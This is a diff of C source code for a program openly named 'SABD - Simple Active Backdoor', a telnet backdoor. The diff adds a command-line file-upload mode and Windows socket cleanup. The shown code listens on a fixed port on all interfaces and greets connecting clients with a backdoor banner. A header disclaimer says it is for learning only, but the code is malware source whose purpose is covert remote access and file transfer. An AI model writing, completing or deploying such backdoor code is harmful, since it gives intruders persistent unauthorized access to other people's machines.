@@ -1,7 +1,7 @@
 /*
  ***************************************************
  * A simple backdoor for telnet.
- * by Philip Simonson
+ * by Philip "5n4k3" Simonson
  ***************************************************
  * Do NOT use for malicious activity. This was
  * created simply to learn from. This isn't very
@@ -9,6 +9,8 @@
  * "cracking".
  ***************************************************
  */
+
+/* --- Haven't tested the file upload yet --- */
 
 #if defined(_WIN32)
 	#include <winsock2.h>
@@ -22,6 +24,7 @@
 #include <stdlib.h>
 #include <stddef.h>
 #include <string.h>
+#include <ctype.h>
 #include <errno.h>
 #include <unistd.h>
 
@@ -33,6 +36,7 @@ int main(argc,argv)
 	int argc;
 	char **argv;
 {
+	int upload_file();
 	void handle_clients();
 	int serverfd;
 	struct sockaddr_in server;
@@ -50,89 +54,95 @@ int main(argc,argv)
 	ZeroMemory(msg,sizeof(msg));
 #endif
 
-	errno = 0;
-	if((serverfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
-		fprintf(stderr,"Error: %s\n",strerror(errno));
+	if(argc < 2) {
+		errno = 0;
+		if((serverfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
+			fprintf(stderr,"Error: %s\n",strerror(errno));
 #if defined(_WIN32)
-		WSACleanup();
+			WSACleanup();
 #endif
-		return -1;
-	}
-
-#if defined(_WIN32)
-	ZeroMemory(&server,sizeof(server));
-#else
-	bzero(&server,sizeof(server));
-	bzero(buf,sizeof(buf));
-	bzero(msg,sizeof(msg));
-#endif
-	server.sin_family = AF_INET;
-	server.sin_port = htons(MY_PORT);
-	server.sin_addr.s_addr = htonl(INADDR_ANY);
-
-	errno = 0;
-	if(bind(serverfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
-		fprintf(stderr,"Error: %s\n",strerror(errno));
-#if defined(_WIN32)
-		closesocket(serverfd);
-		WSACleanup();
-#else
-		close(serverfd);
-#endif
-		return -1;
-	}
-	printf("%s bound to port [%d].\n",inet_ntoa(server.sin_addr),MY_PORT);
-
-	errno = 0;
-	if(listen(serverfd,1) < 0) {
-		fprintf(stderr,"Error: %s\n",strerror(errno));
-#if defined(_WIN32)
-		closesocket(serverfd);
-		WSACleanup();
-#else
-		close(serverfd);
-#endif
-		return -1;
-	}
-
-	while(1) {
-		int clientfd;
-		struct sockaddr_in client;
-		int clientlen = sizeof(client);
-		clientfd = accept(serverfd,(struct sockaddr*)&client,&clientlen);
-		if(clientfd > 0) {
-			printf("%s:%d client connected.\n",inet_ntoa(client.sin_addr),
-				MY_PORT);
-			memset(msg,0,sizeof(msg));
-			sprintf(msg,"SABD - Simple Active Backdoor %s\r\nType 'help' to find out what you can do...\r\n",VERSION_NUMBER);
-			if(send(clientfd,msg,strlen(msg),0) != strlen(msg)) {
-				puts("Couldn't send intro text.\n");
-			}
-			handle_clients(&clientfd,inet_ntoa(client.sin_addr));
-#if defined(_WIN32)
-			if(closesocket(clientfd) == 0) {
-				printf("%s:%d client disconnected.\n",
-					inet_ntoa(client.sin_addr),
-					MY_PORT);
-			}
-#else
-			if(close(clientfd) == 0) {
-				printf("%s:%d client disconnected.\n",
-					inet_ntoa(client.sin_addr),
-					MY_PORT);
-			}
-#endif
-		} else {
-			puts("Cannot accept client connection.");
+			return -1;
 		}
-	}
 
 #if defined(_WIN32)
-	closesocket(serverfd);
-	WSACleanup();
+		ZeroMemory(&server,sizeof(server));
 #else
-	close(serverfd);
+		bzero(&server,sizeof(server));
+		bzero(buf,sizeof(buf));
+		bzero(msg,sizeof(msg));
 #endif
+		server.sin_family = AF_INET;
+		server.sin_port = htons(MY_PORT);
+		server.sin_addr.s_addr = htonl(INADDR_ANY);
+
+		errno = 0;
+		if(bind(serverfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
+			fprintf(stderr,"Error: %s\n",strerror(errno));
+#if defined(_WIN32)
+			closesocket(serverfd);
+			WSACleanup();
+#else
+			close(serverfd);
+#endif
+			return -1;
+		}
+		printf("%s bound to port [%d].\n",inet_ntoa(server.sin_addr),MY_PORT);
+
+		errno = 0;
+		if(listen(serverfd,1) < 0) {
+			fprintf(stderr,"Error: %s\n",strerror(errno));
+#if defined(_WIN32)
+			closesocket(serverfd);
+			WSACleanup();
+#else
+			close(serverfd);
+#endif
+			return -1;
+		}
+
+		while(1) {
+			int clientfd;
+			struct sockaddr_in client;
+			int clientlen = sizeof(client);
+			clientfd = accept(serverfd,(struct sockaddr*)&client,&clientlen);
+			if(clientfd > 0) {
+				printf("%s:%d client connected.\n",inet_ntoa(client.sin_addr),
+					MY_PORT);
+				memset(msg,0,sizeof(msg));
+				sprintf(msg,"SABD - Simple Active Backdoor %s\r\nType 'help' to find out what you can do...\r\n",VERSION_NUMBER);
+				if(send(clientfd,msg,strlen(msg),0) != strlen(msg)) {
+					puts("Couldn't send intro text.\n");
+				}
+				handle_clients(&clientfd,inet_ntoa(client.sin_addr));
+#if defined(_WIN32)
+				if(closesocket(clientfd) == 0) {
+					printf("%s:%d client disconnected.\n",
+						inet_ntoa(client.sin_addr),
+						MY_PORT);
+				}
+#else
+				if(close(clientfd) == 0) {
+					printf("%s:%d client disconnected.\n",
+						inet_ntoa(client.sin_addr),
+						MY_PORT);
+				}
+#endif
+			} else {
+				puts("Cannot accept client connection.");
+			}
+		}
+
+#if defined(_WIN32)
+		closesocket(serverfd);
+		WSACleanup();
+#else
+		close(serverfd);
+#endif
+	} else if(argc == 5 && argv[1][0] == '-' && argv[1][1] == 'u') {
+		return upload_file(argv[2],argv[3],atoi(argv[4]));
+	} else {
+		printf("Usage: %s [-u] filename.ext",argv[0]);
+	}
 	return 0;
 }
 
@@ -248,6 +258,9 @@ int upload_file(address,filename,isserver)
 
 	if((sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
 		perror("socket()");
+#if defined(_WIN32)
+		WSACleanup();
+#endif
 		return 1;
 	}
 
@@ -265,6 +278,7 @@ int upload_file(address,filename,isserver)
 			perror("bind()");
 #if defined(_WIN32)
 			closesocket(sockfd);
+			WSACleanup();
 #else
 			close(sockfd);
 #endif
@@ -276,6 +290,7 @@ int upload_file(address,filename,isserver)
 			perror("bind()");
 #if defined(_WIN32)
 			closesocket(sockfd);
+			WSACleanup();
 #else
 			close(sockfd);
 #endif
@@ -286,6 +301,7 @@ int upload_file(address,filename,isserver)
 			puts("Error: Cannot accept client connection sorry :(");
 #if defined(_WIN32)
 			closesocket(sockfd);
+			WSACleanup();
 #else
 			close(sockfd);
 #endif
@@ -295,6 +311,14 @@ int upload_file(address,filename,isserver)
 
 		if(getcwd(curdir,sizeof(curdir)) == NULL) {
 			perror("getcwd()");
+#if defined(_WIN32)
+			closesocket(clientfd);
+			closesocket(sockfd);
+			WSACleanup();
+#else
+			close(clientfd);
+			close(sockfd);
+#endif
 			return -1;
 		}
 		strncat(curdir,filename,sizeof(curdir));
@@ -303,6 +327,7 @@ int upload_file(address,filename,isserver)
 #if defined(_WIN32)
 			closesocket(clientfd);
 			closesocket(sockfd);
+			WSACleanup();
 #else
 			close(clientfd);
 			close(sockfd);
@@ -330,10 +355,9 @@ int upload_file(address,filename,isserver)
 		if(bind(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
 			perror("bind()");
 #if defined(_WIN32)
-			closesocket(clientfd);
 			closesocket(sockfd);
+			WSACleanup();
 #else
-			close(clientfd);
 			close(sockfd);
 #endif
 			return -1;
@@ -344,6 +368,7 @@ int upload_file(address,filename,isserver)
 			puts("Error: Cannot connect to server sorry :(");
 #if defined(_WIN32)
 			closesocket(sockfd);
+			WSACleanup();
 #else
 			close(sockfd);
 #endif
@@ -352,6 +377,14 @@ int upload_file(address,filename,isserver)
 
 		if(getcwd(curdir,sizeof(curdir)) == NULL) {
 			perror("getcwd()");
+#if defined(_WIN32)
+			closesocket(clientfd);
+			closesocket(sockfd);
+			WSACleanup();
+#else
+			close(clientfd);
+			close(sockfd);
+#endif
 			return -1;
 		}
 		strncat(curdir,filename,sizeof(curdir));
@@ -361,6 +394,7 @@ int upload_file(address,filename,isserver)
 #if defined(_WIN32)
 			closesocket(clientfd);
 			closesocket(sockfd);
+			WSACleanup();
 #else
 			close(clientfd);
 			close(sockfd);
@@ -385,6 +419,7 @@ int upload_file(address,filename,isserver)
 #if defined(_WIN32)
 		closesocket(clientfd);
 		closesocket(sockfd);
+		WSACleanup();
 #else
 		close(clientfd);
 		close(sockfd);
